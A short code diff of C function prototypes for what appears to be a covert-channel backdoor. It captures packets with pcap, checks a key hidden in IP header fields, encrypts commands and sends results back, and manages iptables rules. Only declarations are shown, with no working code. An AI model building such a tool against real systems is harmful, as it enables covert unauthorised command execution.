@@ -83,15 +83,15 @@ struct payload{
     char buffer[1024]; // for either commands or results
 };
 
+struct filter Filter;
 
 //char GetLocalIP(char *device);
 char* iptables(char *port, char *ip, char *protocol);
-int Packetcapture();
+int Packetcapture(char *filter);
 void ReadPacket(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseIP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParseTCP(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void ParsePayload(const u_char *payload, int len);
-void ParsePattern(u_char* args, const struct pcap_pkthdr* pkthdr, const u_char* packet);
 void CreatePayload(char *command, unsigned char *encrypted);
 void SendPayload(const unsigned char *tcp_payload);
 bool CheckKey(u_char ip_tos, u_short ip_id, bool type);
